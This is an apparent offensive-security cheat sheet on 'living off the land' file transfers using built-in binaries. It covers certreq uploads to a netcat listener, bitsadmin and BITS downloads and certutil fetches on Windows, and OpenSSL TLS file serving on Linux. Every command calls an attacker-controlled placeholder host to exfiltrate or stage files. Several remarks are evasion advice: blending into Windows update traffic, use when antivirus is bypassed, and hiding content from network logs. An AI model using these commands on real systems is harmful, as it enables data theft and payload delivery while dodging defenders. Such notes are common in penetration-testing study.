# Living Off the Land — File Transfers

Reference sites: LOLBAS (Windows) → search `/download` or `/upload`. GTFOBins (Linux) → search `+file download` or `+file upload`.

---

## Windows LOLBins

Upload a file to your nc listener via certreq — POST request, file content lands in the nc session:

```cmd
certreq.exe -Post -config http://<LHOST>:8000/ <FILE>
```

```bash
sudo nc -lvnp 8000
```

BITS download — blends into background Windows update traffic:

```cmd
bitsadmin /transfer wcb /priority foreground http://<LHOST>:8000/<FILE> <OUTPATH>
```

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<LHOST>:8000/<FILE>" -Destination "<OUTPATH>"
```

Certutil download — flagged by AMSI on modern Windows, use only if AV is absent/bypassed:

```cmd
certutil.exe -verifyctl -split -f http://<LHOST>:8000/<FILE>
```

> [!warning] Certutil for file transfer is detected as malicious by AMSI on all current Windows versions. BITS is significantly quieter — prefer it.

---

## Linux GTFOBins

OpenSSL as an encrypted nc-style file server — serves a file over TLS:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <FILE>
```

Pull from the target:

```bash
openssl s_client -connect <LHOST>:80 -quiet > <OUTFILE>
```

> [!tip] OpenSSL transfer is encrypted in transit — useful when you need to avoid plaintext file content appearing in network logs but can't use HTTPS or SSH.